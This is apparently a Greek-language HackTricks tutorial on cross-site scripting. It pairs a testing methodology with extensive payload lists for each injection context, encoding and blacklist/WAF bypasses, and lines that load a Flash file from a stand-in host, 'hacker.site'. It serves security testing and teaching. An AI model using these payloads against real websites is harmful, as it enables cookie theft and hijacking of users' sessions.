# XSS (Cross Site Scripting)

{{#include ../../banners/hacktricks-training.md}}

## Μεθοδολογία

1. Έλεγξε αν **κάποια τιμή που ελέγχεις** (_parameters_, _path_, _headers_?, _cookies_?) **αντανακλάται** στο HTML ή **χρησιμοποιείται** από κώδικα **JS**.
2. **Εντόπισε το context** όπου αντανακλάται/χρησιμοποιείται.
3. Εάν είναι **αντανακλώμενο**
1. Έλεγξε **ποιά σύμβολα μπορείς να χρησιμοποιήσεις** και ανάλογα ετοίμασε το payload:
1. Σε **raw HTML**:
1. Μπορείς να δημιουργήσεις νέα HTML tags;
2. Μπορείς να χρησιμοποιήσεις events ή attributes που υποστηρίζουν το πρωτόκολλο `javascript:` ;
3. Μπορείς να παρακάμψεις προστασίες;
4. Το HTML περιεχόμενο ερμηνεύεται από κάποια client side JS engine (_AngularJS_, _VueJS_, _Mavo_...); θα μπορούσες να εκμεταλλευτείς ένα [**Client Side Template Injection**](../client-side-template-injection-csti.md).
5. Αν δεν μπορείς να δημιουργήσεις HTML tags που να εκτελούν JS, μπορείς να εκμεταλλευτείς ένα [**Dangling Markup - HTML scriptless injection**](../dangling-markup-html-scriptless-injection/index.html);
2. Μέσα σε ένα **HTML tag**:
1. Μπορείς να βγεις στο raw HTML context;
2. Μπορείς να δημιουργήσεις νέα events/attributes για να εκτελέσεις JS κώδικα;
3. Το attribute όπου είσαι παγιδευμένος υποστηρίζει εκτέλεση JS;
4. Μπορείς να παρακάμψεις προστασίες;
3. Μέσα σε **JavaScript code**:
1. Μπορείς να κάνεις escape το `<script>` tag;
2. Μπορείς να κάνεις escape το string και να εκτελέσεις διαφορετικό JS code;
3. Είναι το input σου μέσα σε template literals \`\`;
4. Μπορείς να παρακάμψεις προστασίες;
4. Javascript **function** που εκτελείται
1. Μπορείς να υποδείξεις το όνομα της function προς εκτέλεση. π.χ.: `?callback=alert(1)`
4. Εάν **χρησιμοποιείται**:
1. Μπορείς να εκμεταλλευτείς ένα **DOM XSS**, πρόσεξε με ποιον τρόπο ελέγχεται το input σου και αν το **ελεγχόμενο input χρησιμοποιείται από κάποιο sink.**

Όταν δουλεύεις πάνω σε ένα πολύπλοκο XSS ίσως σε ενδιαφέρει να διαβάσεις σχετικά:


{{#ref}}
debugging-client-side-js.md
{{#endref}}

## Αντανακλώμενες τιμές

Για να εκμεταλλεύσεις επιτυχώς ένα XSS, το πρώτο που πρέπει να βρεις είναι μια **τιμή που ελέγχεις και αντανακλάται** στη σελίδα.

- **Ενδιάμεσα αντανακλώμενο**: Αν βρεις ότι η τιμή ενός parameter ή ακόμα και του path αντανακλάται στη σελίδα, μπορείς να εκμεταλλεύσεις ένα **Reflected XSS**.
- **Αποθηκευμένο και αντανακλώμενο**: Αν βρεις ότι μια τιμή που ελέγχεις αποθηκεύεται στον server και αντανακλάται κάθε φορά που επισκέπτεσαι μια σελίδα, μπορείς να εκμεταλλεύσεις ένα **Stored XSS**.
- **Προσπελάζεται μέσω JS**: Αν βρεις ότι μια τιμή που ελέγχεις προσπελάζεται μέσω JS, μπορείς να εκμεταλλευτείς ένα **DOM XSS**.

## Συμφραζόμενα

Όταν προσπαθείς να εκμεταλλευτείς ένα XSS, το πρώτο που πρέπει να γνωρίζεις είναι **πού αντανακλάται το input σου**. Ανάλογα με το context, θα μπορείς να εκτελέσεις αυθαίρετο JS κώδικα με διαφορετικούς τρόπους.

### Ακατέργαστο HTML

Αν το input σου **αντανακλάται στο raw HTML** της σελίδας, θα χρειαστεί να εκμεταλλευτείς κάποιο **HTML tag** για να εκτελέσεις JS κώδικα: `<img , <iframe , <svg , <script` ... αυτά είναι μόνο μερικά από τα πολλά πιθανά HTML tags που μπορείς να χρησιμοποιήσεις.\
Επίσης, λάβε υπόψη το [Client Side Template Injection](../client-side-template-injection-csti.md).

### Μέσα σε attribute ετικέτας HTML

Αν το input σου αντανακλάται μέσα στην τιμή ενός attribute ενός tag μπορείς να δοκιμάσεις:

1. Να **ξεφύγεις από το attribute και από το tag** (τότε θα βρεθείς στο raw HTML) και να δημιουργήσεις νέο HTML tag για να εκμεταλλευτείς: `"><img [...]`
2. Αν **μπορείς να ξεφύγεις από το attribute αλλά όχι από το tag** (`>` είναι encoded ή διαγράφεται), ανάλογα με το tag μπορείς να **δημιουργήσεις ένα event** που θα εκτελέσει JS κώδικα: `" autofocus onfocus=alert(1) x="`
3. Αν **δεν μπορείς να ξεφύγεις από το attribute** (`"` είναι encoded ή διαγράφεται), τότε ανάλογα με **το ποιο attribute** αντανακλά την τιμή σου και **αν ελέγχεις ολόκληρη την τιμή ή μόνο ένα μέρος της**, θα μπορέσεις να το εκμεταλλευτείς. Για **παράδειγμα**, αν ελέγχεις ένα event όπως `onclick=` θα καταφέρεις να το κάνεις να εκτελέσει αυθαίρετο κώδικα όταν γίνει click. Ένα ακόμα ενδιαφέρον **παράδειγμα** είναι το attribute `href`, όπου μπορείς να χρησιμοποιήσεις το πρωτόκολλο `javascript:` για να εκτελέσεις αυθαίρετο κώδικα: **`href="javascript:alert(1)"`**
4. Αν το input σου αντανακλάται μέσα σε "**unexpoitable tags**" μπορείς να δοκιμάσεις το κόλπο με το **`accesskey`** για να εκμεταλλευτείς το vuln (θα χρειαστείς κάποια μορφή social engineering για να το αξιοποιήσεις): **`" accesskey="x" onclick="alert(1)" x="`**

Παράξενο παράδειγμα του Angular που εκτελεί XSS αν ελέγχεις ένα όνομα κλάσης:
```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```
### Μέσα σε JavaScript κώδικα

Σε αυτή την περίπτωση το input σας ανακλάται ανάμεσα σε **`<script> [...] </script>`** tags μιας HTML σελίδας, μέσα σε ένα `.js` αρχείο ή μέσα σε ένα attribute που χρησιμοποιεί το πρωτόκολλο **`javascript:`**:

- Αν ανακλάται ανάμεσα σε **`<script> [...] </script>`** tags, ακόμα κι αν το input σας είναι μέσα σε οποιοδήποτε είδος quotes, μπορείτε να δοκιμάσετε να εισάγετε `</script>` και να αποδράσετε από αυτό το context. Αυτό λειτουργεί επειδή ο **browser θα πρώτα κάνει parse στα HTML tags** και μετά στο περιεχόμενο, επομένως δεν θα παρατηρήσει ότι το εισαγόμενο `</script>` tag είναι μέσα στον HTML κώδικα.
- Αν ανακλάται **μέσα σε JS string** και το προηγούμενο κόλπο δεν δουλεύει, θα χρειαστεί να **βγείτε** από το string, **εκτελέσετε** τον κώδικά σας και **ανασυνθέσετε** τον JS κώδικα (αν υπάρχει οποιοδήποτε σφάλμα, δεν θα εκτελεστεί:
- `'-alert(1)-'`
- `';-alert(1)//`
- `\';alert(1)//`
- Αν ανακλάται μέσα σε template literals μπορείτε να **ενσωματώσετε JS εκφράσεις** χρησιμοποιώντας τη σύνταξη `${ ... }`: `` var greetings = `Hello, ${alert(1)}` ``
- **Unicode encode** λειτουργεί για να γράψετε **valid javascript code**:
```javascript
alert(1)
alert(1)
alert(1)
```
#### Javascript Hoisting

Javascript Hoisting αναφέρεται στην ευκαιρία να **δηλώνεις συναρτήσεις, μεταβλητές ή κλάσεις αφού χρησιμοποιηθούν ώστε να μπορείς να εκμεταλλευτείς σενάρια όπου ένα XSS χρησιμοποιεί μη δηλωμένες μεταβλητές ή συναρτήσεις.**\
**Έλεγξε την παρακάτω σελίδα για περισσότερες πληροφορίες:**


{{#ref}}
js-hoisting.md
{{#endref}}

### Javascript Function

Several web pages have endpoints that **δέχονται ως παράμετρο το όνομα της συνάρτησης που θα εκτελεστεί**. Ένα συνηθισμένο παράδειγμα που βλέπεις στη φύση είναι κάτι σαν: `?callback=callbackFunc`.

Ένας καλός τρόπος για να καταλάβεις αν κάτι που δίνεται απευθείας από τον χρήστη προσπαθεί να εκτελεστεί είναι **η τροποποίηση της τιμής της παραμέτρου** (για παράδειγμα σε 'Vulnerable') και να κοιτάξεις στην κονσόλα για σφάλματα όπως:

![](<../../images/image (711).png>)

Σε περίπτωση που είναι ευάλωτο, μπορείς να καταφέρεις να **προκαλέσεις ένα alert** απλώς στέλνοντας την τιμή: **`?callback=alert(1)`**. Ωστόσο, είναι πολύ συνηθισμένο αυτά τα endpoints να **ελέγχουν το περιεχόμενο** ώστε να επιτρέπουν μόνο γράμματα, αριθμούς, τελείες και underscores (**`[\w\._]`**).

Ωστόσο, ακόμη και με αυτόν τον περιορισμό είναι ακόμα δυνατό να εκτελεστούν ορισμένες ενέργειες. Αυτό συμβαίνει επειδή μπορείς να χρησιμοποιήσεις αυτούς τους έγκυρους χαρακτήρες για να **προσπελάσεις οποιοδήποτε στοιχείο στο DOM**:

![](<../../images/image (747).png>)

Μερικές χρήσιμες συναρτήσεις για αυτό:
```
firstElementChild
lastElementChild
nextElementSibiling
lastElementSibiling
parentElement
```
Μπορείτε επίσης να δοκιμάσετε να **trigger Javascript functions** απευθείας: `obj.sales.delOrders`.

Ωστόσο, συνήθως τα endpoints που εκτελούν την ενδεικνυόμενη συνάρτηση είναι endpoints χωρίς πολύ ενδιαφέρον DOM, **other pages in the same origin** θα έχουν ένα **πιο ενδιαφέρον DOM** για να εκτελέσουν περισσότερες ενέργειες.

Επομένως, για να **εκμεταλλευτείτε αυτή την ευπάθεια σε διαφορετικό DOM** αναπτύχθηκε η εκμετάλλευση **Same Origin Method Execution (SOME)**:


{{#ref}}
some-same-origin-method-execution.md
{{#endref}}

### DOM

Υπάρχει **JS code** που χρησιμοποιεί **ανεπαρκώς ασφαλή** κάποια **δεδομένα που ελέγχονται από έναν επιτιθέμενο** όπως `location.href`. Ένας επιτιθέμενος μπορεί να εκμεταλλευτεί αυτό για να εκτελέσει αυθαίρετο JS code.


{{#ref}}
dom-xss.md
{{#endref}}

### **Universal XSS**

Αυτός ο τύπος XSS μπορεί να βρεθεί **οπουδήποτε**. Δεν εξαρτώνται μόνο από την εκμετάλλευση της πλευράς client μιας web εφαρμογής αλλά από **οποιοδήποτε** **πλαίσιο**. Αυτός ο τύπος **αυθαίρετης εκτέλεσης JavaScript** μπορεί ακόμη να χρησιμοποιηθεί για να αποκτηθεί **RCE**, να **διαβαστούν** **αυθαίρετα** **αρχεία** σε clients και servers, και άλλα.\
Κάποια **παραδείγματα**:


{{#ref}}
server-side-xss-dynamic-pdf.md
{{#endref}}


{{#ref}}
../../network-services-pentesting/pentesting-web/electron-desktop-apps/
{{#endref}}

## WAF bypass encoding image

![from https://twitter.com/hackerscrolls/status/1273254212546281473?s=21](<../../images/EauBb2EX0AERaNK (1).jpg>)

## Injecting inside raw HTML

Όταν το input σας αντανακλάται **μέσα στη σελίδα HTML** ή μπορείτε να διαφύγετε και να εισάγετε HTML κώδικα σε αυτό το context, το **πρώτο** πράγμα που πρέπει να κάνετε είναι να ελέγξετε αν μπορείτε να εκμεταλλευτείτε το `<` για να δημιουργήσετε νέα tags: Απλά δοκιμάστε να **ανακλάσετε** αυτό το **char** και ελέγξτε αν γίνεται **HTML encoded** ή **διαγράφεται** ή αν **ανακλάται χωρίς αλλαγές**. **Μόνο στην τελευταία περίπτωση θα μπορέσετε να το εκμεταλλευτείτε**.\
Για αυτές τις περιπτώσεις επίσης **να έχετε υπόψη** [**Client Side Template Injection**](../client-side-template-injection-csti.md)**.**\
_**Σημείωση: Ένα σχόλιο HTML μπορεί να κλείσει χρησιμοποιώντας\*\***\***\*`-->`\*\***\***\*ή \*\***`--!>`\*\*_ 

Σε αυτή την περίπτωση και αν δεν χρησιμοποιείται black/whitelisting, μπορείτε να χρησιμοποιήσετε payloads όπως:
```html
<script>
alert(1)
</script>
<img src="x" onerror="alert(1)" />
<svg onload=alert('XSS')>
```
Αλλά, αν γίνεται black/whitelisting των tags/attributes, θα χρειαστεί να **brute-force ποια tags** μπορείτε να δημιουργήσετε.\
Μόλις έχετε **εντοπίσει ποια tags επιτρέπονται**, θα χρειαστεί να **brute-force attributes/events** εντός των έγκυρων tags που βρέθηκαν, για να δείτε πώς μπορείτε να επιτεθείτε στο context.

### Tags/Events brute-force

Go to [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) and click on _**Copy tags to clipboard**_. Στη συνέχεια, στείλτε τα όλα χρησιμοποιώντας Burp intruder και ελέγξτε αν κάποιο tag δεν εντοπίστηκε ως κακόβουλο από το WAF. Μόλις ανακαλύψετε ποια tags μπορείτε να χρησιμοποιήσετε, μπορείτε να **brute force όλα τα events** χρησιμοποιώντας τα έγκυρα tags (στην ίδια σελίδα κάντε κλικ στο _**Copy events to clipboard**_ και ακολουθήστε την ίδια διαδικασία όπως πριν).

### Custom tags

Αν δεν βρήκατε κανένα έγκυρο HTML tag, μπορείτε να δοκιμάσετε να **δημιουργήσετε ένα custom tag** και να εκτελέσετε JS code με το `onfocus` attribute. Στο XSS request, χρειάζεται να τελειώσετε το URL με `#` για να κάνετε την σελίδα να **focus on that object** και να **execute** τον κώδικα:
```
/?search=<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x
```
### Blacklist Bypasses

Αν χρησιμοποιείται κάποιος τύπος blacklist, μπορείς να προσπαθήσεις να τον bypass με μερικά χαζά κόλπα:
```javascript
//Random capitalization
<script> --> <ScrIpT>
<img --> <ImG

//Double tag, in case just the first match is removed
<script><script>
<scr<script>ipt>
<SCRscriptIPT>alert(1)</SCRscriptIPT>

//You can substitude the space to separate attributes for:
/
/*%00/
/%00*/
%2F
%0D
%0C
%0A
%09

//Unexpected parent tags
<svg><x><script>alert('1'&#41</x>

//Unexpected weird attributes
<script x>
<script a="1234">
<script ~~~>
<script/random>alert(1)</script>
<script      ///Note the newline
>alert(1)</script>
<scr\x00ipt>alert(1)</scr\x00ipt>

//Not closing tag, ending with " <" or " //"
<iframe SRC="javascript:alert('XSS');" <
<iframe SRC="javascript:alert('XSS');" //

//Extra open
<<script>alert("XSS");//<</script>

//Just weird an unexpected, use your imagination
<</script/script><script>
<input type=image src onerror="prompt(1)">

//Using `` instead of parenthesis
onerror=alert`1`

//Use more than one
<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //
```
### Length bypass (small XSSs)

> [!NOTE] > **Περισσότερα tiny XSS για διαφορετικά περιβάλλοντα** payload [**μπορούν να βρεθούν εδώ**](https://github.com/terjanq/Tiny-XSS-Payloads) και [**εδώ**](https://tinyxss.terjanq.me).
```html
<!-- Taken from the blog of Jorge Lajara -->
<svg/onload=alert``> <script src=//aa.es> <script src=//℡㏛.pw>
```
The last one is using 2 unicode characters which expands to 5: telsr\
Περισσότεροι από αυτούς τους χαρακτήρες μπορούν να βρεθούν [here](https://www.unicode.org/charts/normalization/).\
Για να ελέγξετε σε ποιους χαρακτήρες αποσυντίθενται δείτε [here](https://www.compart.com/en/unicode/U+2121).

### Click XSS - Clickjacking

Αν, για να εκμεταλλευτείτε την ευπάθεια, χρειάζεται ο **user to click a link or a form** με προ-συμπληρωμένα δεδομένα, μπορείτε να δοκιμάσετε να [**abuse Clickjacking**](../clickjacking.md#xss-clickjacking) (αν η σελίδα είναι ευάλωτη).

### Αδύνατο - Dangling Markup

Αν απλά νομίζετε ότι **it's impossible to create an HTML tag with an attribute to execute JS code**, θα πρέπει να ελέγξετε [**Danglig Markup** ](../dangling-markup-html-scriptless-injection/index.html) γιατί θα μπορούσατε να **exploit** την ευπάθεια **χωρίς** να εκτελέσετε **JS** code.

## Ενέγχυση μέσα σε HTML tag

### Μέσα στο tag/escaping from attribute value

Αν βρίσκεστε **inside a HTML tag**, το πρώτο που μπορείτε να δοκιμάσετε είναι να **escape** από το tag και να χρησιμοποιήσετε μερικές από τις τεχνικές που αναφέρονται στην [previous section](#injecting-inside-raw-html) για να εκτελέσετε JS code.\
Αν **cannot escape from the tag**, μπορείτε να δημιουργήσετε νέα attributes μέσα στο tag για να προσπαθήσετε να εκτελέσετε JS code, για παράδειγμα χρησιμοποιώντας κάποιο payload σαν το παρακάτω (_note that in this example double quotes are use to escape from the attribute, you won't need them if your input is reflected directly inside the tag_):
```bash
" autofocus onfocus=alert(document.domain) x="
" onfocus=alert(1) id=x tabindex=0 style=display:block>#x #Access http://site.com/?#x t
```
**Γεγονότα στυλ**
```python
<p style="animation: x;" onanimationstart="alert()">XSS</p>
<p style="animation: x;" onanimationend="alert()">XSS</p>

#ayload that injects an invisible overlay that will trigger a payload if anywhere on the page is clicked:
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;" onclick="alert(1)"></div>
#moving your mouse anywhere over the page (0-click-ish):
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;" onmouseover="alert(1)"></div>
```
### Μέσα στο attribute

Ακόμη και αν **δεν μπορείτε να διαφύγετε από το attribute** (`"` κωδικοποιείται ή διαγράφεται), ανάλογα με **ποιο attribute** αντανακλά την τιμή σας και **εάν ελέγχετε όλη την τιμή ή μόνο ένα μέρος**, θα μπορείτε να το εκμεταλλευτείτε. Για **παράδειγμα**, αν ελέγχετε ένα event όπως `onclick=` θα μπορείτε να το κάνετε να εκτελέσει arbitrary code όταν γίνει κλικ.\
Ένα άλλο ενδιαφέρον **παράδειγμα** είναι το attribute `href`, όπου μπορείτε να χρησιμοποιήσετε το `javascript:` πρωτόκολλο για να εκτελέσετε arbitrary code: **`href="javascript:alert(1)"`**

**Παράκαμψη μέσα στο event χρησιμοποιώντας HTML encoding/URL encode**

Οι **HTML encoded characters** μέσα στην τιμή των attributes των HTML tags **αποκωδικοποιούνται κατά την εκτέλεση**. Επομένως, κάτι σαν το παρακάτω θα είναι έγκυρο (το payload είναι με έντονα): `<a id="author" href="http://none" onclick="var tracker='http://foo?`**`&apos;-alert(1)-&apos;`**`';">Go Back </a>`

Σημειώστε ότι **οποιοσδήποτε τύπος HTML encode είναι έγκυρος**:
```javascript
//HTML entities
&apos;-alert(1)-&apos;
//HTML hex without zeros
&#x27-alert(1)-&#x27
//HTML hex with zeros
&#x00027-alert(1)-&#x00027
//HTML dec without zeros
&#39-alert(1)-&#39
//HTML dec with zeros
&#00039-alert(1)-&#00039

<a href="javascript:var a='&apos;-alert(1)-&apos;'">a</a>
<a href="&#106;avascript:alert(2)">a</a>
<a href="jav&#x61script:alert(3)">a</a>
```
**Σημειώστε ότι το URL encode θα λειτουργήσει επίσης:**
```python
<a href="https://example.com/lol%22onmouseover=%22prompt(1);%20img.png">Click</a>
```
**Παράκαμψη μέσα σε event χρησιμοποιώντας Unicode encode**
```javascript
//For some reason you can use unicode to encode "alert" but not "(1)"
<img src onerror=\u0061\u006C\u0065\u0072\u0074(1) />
<img src onerror=\u{61}\u{6C}\u{65}\u{72}\u{74}(1) />
```
### Ειδικά πρωτόκολλα μέσα στο attribute

Εκεί μπορείτε να χρησιμοποιήσετε τα πρωτόκολλα **`javascript:`** ή **`data:`** σε μερικά σημεία για να **εκτελέσετε αυθαίρετο κώδικα JS**. Κάποια θα απαιτήσουν αλληλεπίδραση χρήστη, ενώ κάποια όχι.
```javascript
javascript:alert(1)
JavaSCript:alert(1)
javascript:%61%6c%65%72%74%28%31%29 //URL encode
javascript&colon;alert(1)
javascript&#x003A;alert(1)
javascript&#58;alert(1)
javascript:alert(1)
java        //Note the new line
script:alert(1)

data:text/html,<script>alert(1)</script>
DaTa:text/html,<script>alert(1)</script>
data:text/html;charset=iso-8859-7,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
data:text/html;charset=UTF-8,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
data:text/html;charset=thing;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg
data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==
```
**Μέρη όπου μπορείτε να εισάγετε αυτά τα πρωτόκολλα**

**Γενικά** το `javascript:` πρωτόκολλο μπορεί να **χρησιμοποιηθεί σε οποιοδήποτε tag που δέχεται το attribute `href`** και σε **τα περισσότερα** από τα tag που δέχονται το **attribute `src`** (αλλά όχι `<img`)
```html
<a href="javascript:alert(1)">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
<form action="javascript:alert(1)"><button>send</button></form>
<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
<object data=javascript:alert(3)>
<iframe src=javascript:alert(2)>
<embed src=javascript:alert(1)>

<object data="data:text/html,<script>alert(5)</script>">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
<iframe src="data:text/html,<script>alert(5)</script>"></iframe>

//Special cases
<object data="//hacker.site/xss.swf"> .//https://github.com/evilcos/xss.swf
<embed code="//hacker.site/xss.swf" allowscriptaccess=always> //https://github.com/evilcos/xss.swf
<iframe srcdoc="<svg onload=alert(4);>">
```
**Άλλες τεχνικές συγκαλυψής**

_**Σε αυτήν την περίπτωση, η HTML κωδικοποίηση και η Unicode κωδικοποίηση από την προηγούμενη ενότητα είναι επίσης έγκυρες, καθώς βρίσκεστε μέσα σε ένα attribute.**_
```javascript
<a href="javascript:var a='&apos;-alert(1)-&apos;'">
```
Επιπλέον, υπάρχει ένα ακόμα **ωραίο κόλπο** για αυτές τις περιπτώσεις: **Ακόμα κι αν η είσοδός σου μέσα στο `javascript:...` είναι URL encoded, θα γίνει URL decoded πριν εκτελεστεί.** Οπότε, αν χρειαστεί να **escape** από το **string** χρησιμοποιώντας ένα **single quote** και βλέπεις ότι **it's being URL encoded**, να θυμάσαι ότι **δεν έχει σημασία,** θα **interpreted** ως **single quote** κατά τη διάρκεια της **execution** time.
```javascript
&apos;-alert(1)-&apos;
%27-alert(1)-%27
<iframe src=javascript:%61%6c%65%72%74%28%31%29></iframe>
```
Σημειώστε ότι αν προσπαθήσετε να **χρησιμοποιήσετε και τα δύο** `URLencode + HTMLencode` με οποιαδήποτε σειρά για να κωδικοποιήσετε το **payload**, **δεν θα** **λειτουργήσει**, αλλά μπορείτε να **αναμίξετε τα μέσα στο payload**.

**Χρήση Hex και Octal encode με `javascript:`**

Μπορείτε να χρησιμοποιήσετε **Hex** και **Octal encode** μέσα στο `src` attribute του `iframe` (τουλάχιστον) για να δηλώσετε **HTML tags to execute JS**:
```javascript
//Encoded: <svg onload=alert(1)>
// This WORKS
<iframe src=javascript:'\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e' />
<iframe src=javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76' />

//Encoded: alert(1)
// This doesn't work
<svg onload=javascript:'\x61\x6c\x65\x72\x74\x28\x31\x29' />
<svg onload=javascript:'\141\154\145\162\164\50\61\51' />
```
### Reverse tab nabbing
```javascript
<a target="_blank" rel="opener"
```
Εάν μπορείτε να εισάγετε οποιοδήποτε URL σε μια αυθαίρετη **`<a href=`** tag που περιέχει τα χαρακτηριστικά **`target="_blank" and rel="opener"`**, ελέγξτε την **παρακάτω σελίδα για να εκμεταλλευτείτε αυτή τη συμπεριφορά**:

{{#ref}}
../reverse-tab-nabbing.md
{{#endref}}

### Παράκαμψη on Event Handlers

Καταρχάς ελέγξτε αυτή τη σελίδα ([https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)) για χρήσιμα **"on" event handlers**.\
Σε περίπτωση που υπάρχει κάποια blacklist που σας εμποδίζει να δημιουργήσετε αυτούς τους event handlers, μπορείτε να δοκιμάσετε τις ακόλουθες bypasses:
```javascript
<svg onload%09=alert(1)> //No safari
<svg %09onload=alert(1)>
<svg %09onload%20=alert(1)>
<svg onload%09%20%28%2c%3b=alert(1)>

//chars allowed between the onevent and the "="
IExplorer: %09 %0B %0C %020 %3B
Chrome: %09 %20 %28 %2C %3B
Safari: %2C %3B
Firefox: %09 %20 %28 %2C %3B
Opera: %09 %20 %2C %3B
Android: %09 %20 %28 %2C %3B
```
### XSS σε "Unexploitable tags" (hidden input, link, canonical, meta)

Από [**here**](https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags) **τώρα είναι δυνατό να εκμεταλλευτείτε hidden inputs με:**
```html
<button popvertarget="x">Click me</button>
<input type="hidden" value="y" popover id="x" onbeforetoggle="alert(1)" />
```
Και στα **meta tags**:
```html
<!-- Injection inside meta attribute-->
<meta
name="apple-mobile-web-app-title"
content=""
Twitter
popover
id="newsletter"
onbeforetoggle="alert(2)" />
<!-- Existing target-->
<button popovertarget="newsletter">Subscribe to newsletter</button>
<div popover id="newsletter">Newsletter popup</div>
```
Από [**here**](https://portswigger.net/research/xss-in-hidden-input-fields): Μπορείτε να εκτελέσετε ένα **XSS payload inside a hidden attribute**, εφόσον μπορείτε να **persuade** το **victim** να πατήσει τον **key combination**. Στον Firefox σε Windows/Linux ο συνδυασμός πλήκτρων είναι **ALT+SHIFT+X** και στο OS X είναι **CTRL+ALT+X**. Μπορείτε να ορίσετε διαφορετικό συνδυασμό πλήκτρων χρησιμοποιώντας διαφορετικό πλήκτρο στο access key attribute. Εδώ είναι το vector:
```html
<input type="hidden" accesskey="X" onclick="alert(1)">
```
**Το XSS payload θα είναι κάτι σαν αυτό: `" accesskey="x" onclick="alert(1)" x="`**

### Παρακάμψεις Μαύρης Λίστας

Έχουν ήδη εκτεθεί διάφορα κόλπα με τη χρήση διαφορετικής κωδικοποίησης μέσα σε αυτήν την ενότητα. Επιστρέψτε για να μάθετε πού μπορείτε να χρησιμοποιήσετε:

- **HTML κωδικοποίηση (HTML tags)**
- **Unicode κωδικοποίηση (μπορεί να είναι έγκυρος JS κώδικας):** `\u0061lert(1)`
- **URL κωδικοποίηση**
- **Hex και Octal κωδικοποίηση**
- **data κωδικοποίηση**

**Παρακάμψεις για HTML tags και attributes**

Διαβάστε τις [Blacklist Bypasses of the previous section](#blacklist-bypasses).

**Παρακάμψεις για κώδικα JavaScript**

Διαβάστε τη [λίστα παρακάμψεων JavaScript της επόμενης ενότητας](#javascript-bypass-blacklists-techniques).

### CSS-Gadgets

Αν βρείτε ένα **XSS σε ένα πολύ μικρό μέρος** του web που απαιτεί κάποιο είδος αλληλεπίδρασης (ίσως ένας μικρός σύνδεσμος στο footer με ένα onmouseover element), μπορείτε να προσπαθήσετε να **τροποποιήσετε τον χώρο που καταλαμβάνει αυτό το στοιχείο** για να μεγιστοποιήσετε τις πιθανότητες να ενεργοποιηθεί ο σύνδεσμος.

Για παράδειγμα, θα μπορούσατε να προσθέσετε κάποια styling στο στοιχείο όπως: `position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: red; opacity: 0.5`

Αλλά, αν ο WAF φιλτράρει το style attribute, μπορείτε να χρησιμοποιήσετε CSS Styling Gadgets, οπότε αν βρείτε, για παράδειγμα

> .test {display:block; color: blue; width: 100%\}

και

> \#someid {top: 0; font-family: Tahoma;}

Τώρα μπορείτε να τροποποιήσετε τον σύνδεσμό μας και να τον φέρετε στη μορφή

> \<a href="" id=someid class=test onclick=alert() a="">

Αυτό το κόλπο προέρχεται από [https://medium.com/@skavans\_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703](https://medium.com/@skavans_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703)

## Εισαγωγή μέσα σε κώδικα JavaScript

Σε αυτές τις περιπτώσεις, το **input** σας θα αντανακλάται μέσα στον κώδικα JS ενός `.js` αρχείου ή ανάμεσα σε `<script>...</script>` tags ή σε HTML events που μπορούν να εκτελέσουν JS κώδικα ή σε attributes που δέχονται το `javascript:` protocol.

### Απόδραση του \<script> tag

Αν ο κώδικάς σας εισάγεται μέσα σε `<script> [...] var input = 'reflected data' [...] </script>`, μπορείτε εύκολα να **αποδράσετε κλείνοντας την ετικέτα `<script>`**:
```javascript
</script><img src=1 onerror=alert(document.domain)>
```
